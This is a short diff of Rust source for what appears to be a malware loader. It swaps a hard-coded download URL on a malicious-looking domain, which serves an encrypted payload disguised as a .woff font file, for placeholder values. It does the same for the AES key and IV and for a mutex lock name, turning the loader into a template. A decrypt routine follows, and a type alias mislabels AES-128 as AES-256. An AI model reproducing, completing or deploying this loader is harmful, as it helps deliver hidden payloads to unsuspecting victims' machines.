@@ -9,12 +9,12 @@ use named_lock::Result;
 
 type Aes256CbcDec = cbc::Decryptor<aes::Aes128>;
 
-const URL: &str = "http://grape.amaliciousdomain.xyz:8080/test.woff";
+const URL: &str = "http://URL_REPLACE_ME/test.woff";
 
-const AESKEY: &str = "dZ5q3dpluLhWRaKW";
-const AESIV: &str  = "1oMP8BCaEbmTHj3F";
+const AESKEY: &str = "AES_KEY_REPLACE_ME";
+const AESIV: &str  = "AES_IV_REPLACE_ME";
 
-const LOCKNAME: &str = "3rBoOnIoREnE";
+const LOCKNAME: &str = "RLOCK";
 
 fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
     let mut key = [0x42; 16];
